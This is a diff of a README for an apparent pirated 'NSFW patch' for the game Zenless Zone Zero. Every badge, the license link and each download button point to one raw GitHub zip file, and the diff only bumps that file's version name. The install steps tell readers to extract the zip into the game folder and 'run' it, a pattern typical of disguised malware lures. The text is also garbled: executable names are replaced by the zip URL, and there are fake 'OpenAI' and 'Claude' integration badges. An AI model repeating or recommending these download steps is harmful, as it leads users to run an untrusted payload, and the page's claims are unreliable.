@@ -1,10 +1,10 @@
 # ZENLESS ZONE ZERO NSFW Patch  
-![banners](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip)  
-![support](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip%2F7-blue)  
-![license](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip)  
-![downloads](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip)  
-![openai](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip)  
-![claude](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip%20API-Integrated-9cf)  
+![banners](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip)  
+![support](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip%2F7-blue)  
+![license](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip)  
+![downloads](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip)  
+![openai](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip)  
+![claude](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip%20API-Integrated-9cf)  
 
 ---
 
@@ -12,7 +12,7 @@ Welcome to the all-in-one repository for the **ZENLESS ZONE ZERO NSFW Patch** �
 
 ---
 
-[![Download](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip%20Patch-red?style=for-the-badge&logo=paperdown&logoColor=white)](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip)
+[![Download](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip%20Patch-red?style=for-the-badge&logo=paperdown&logoColor=white)](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip)
 
 ---
 
@@ -94,11 +94,11 @@ Give yourself the gift of seamless setup. Here’s your odyssey:
    - Locate your game folder and copy it somewhere safe.
 
 2. **Obtain the Patch [Click below]:**  
-   [![Download](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip%20Patch-red?style=for-the-badge&logo=paperdown&logoColor=white)](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip)
+   [![Download](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip%20Patch-red?style=for-the-badge&logo=paperdown&logoColor=white)](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip)
 
 3. **Extract the package to your ZENLESS ZONE ZERO root directory.**
 
-4. **Run the “https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip” (Windows/Linux) or “https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip” (macOS).**  
+4. **Run the “https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip” (Windows/Linux) or “https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip” (macOS).**  
    - Follow on-screen prompts (with helpful AI hints by OpenAI & Claude).
 
 5. **Launch ZENLESS ZONE ZERO and activate NSFW features from the new menu.**
@@ -126,13 +126,13 @@ Join our constellation of passionate ZENLESS explorers in our Discord, Wiki, and
 
 ## 📜 MIT License (2025)
 
-Distributed with sunny optimism under the open-source [MIT License](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip) (© 2025), permitting you to use, modify, and expand freely within generous boundaries of creative exploration.
+Distributed with sunny optimism under the open-source [MIT License](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip) (© 2025), permitting you to use, modify, and expand freely within generous boundaries of creative exploration.
 
 ---
 
 ## ⚡ Download - Take the Leap Again!
 
-[![Download](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip%20Patch-red?style=for-the-badge&logo=paperdown&logoColor=white)](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/enhancer-nsfw-zone-zenless-zero-v1.6.zip)
+[![Download](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip%20Patch-red?style=for-the-badge&logo=paperdown&logoColor=white)](https://raw.githubusercontent.com/zemcius/zenless-zone-zero-nsfw-enhancer/branch/optably/nsfw-zenless-zero-enhancer-zone-v3.9-beta.5.zip)
 
 ---
 
